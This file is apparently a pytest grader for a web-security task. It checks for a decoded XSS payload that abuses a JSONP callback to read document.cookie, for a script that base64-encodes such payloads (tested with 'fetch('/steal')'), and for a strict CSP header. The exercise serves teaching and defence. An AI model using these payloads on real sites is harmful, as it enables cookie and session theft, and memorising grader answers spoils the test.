# test_final_state.py

import os
import subprocess
import base64
import pytest

def test_decoded_payload_content():
    payload_path = "/home/user/decoded_payload.txt"
    assert os.path.exists(payload_path), f"File {payload_path} does not exist."

    expected_payload = '<script src="https://cdn.vulnerable.com/jsonp?callback=alert(document.cookie)"></script>'

    with open(payload_path, 'r', encoding='utf-8') as f:
        content = f.read().strip()

    assert content == expected_payload, f"Content of {payload_path} is incorrect. Expected: {expected_payload}, but got: {content}"

def test_craft_exploit_script():
    script_path = "/home/user/craft_exploit.py"
    assert os.path.exists(script_path), f"Script {script_path} does not exist."

    test_payload = "fetch('/steal')"
    expected_html = f'<script src="https://cdn.vulnerable.com/jsonp?callback={test_payload}"></script>'
    expected_b64 = base64.b64encode(expected_html.encode('utf-8')).decode('utf-8')

    try:
        result = subprocess.run(
            ["python3", script_path, test_payload],
            capture_output=True,
            text=True,
            check=True,
            timeout=5
        )
    except subprocess.CalledProcessError as e:
        pytest.fail(f"Running {script_path} failed with error: {e.stderr}")
    except subprocess.TimeoutExpired:
        pytest.fail(f"Running {script_path} timed out.")

    output = result.stdout.strip()
    assert output == expected_b64, f"Output of {script_path} is incorrect. Expected: {expected_b64}, but got: {output}"

def test_secure_csp_content():
    csp_path = "/home/user/secure_csp.txt"
    assert os.path.exists(csp_path), f"File {csp_path} does not exist."

    expected_csp = "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';"

    with open(csp_path, 'r', encoding='utf-8') as f:
        content = f.read().strip()

    assert content == expected_csp, f"Content of {csp_path} is incorrect. Expected: {expected_csp}, but got: {content}"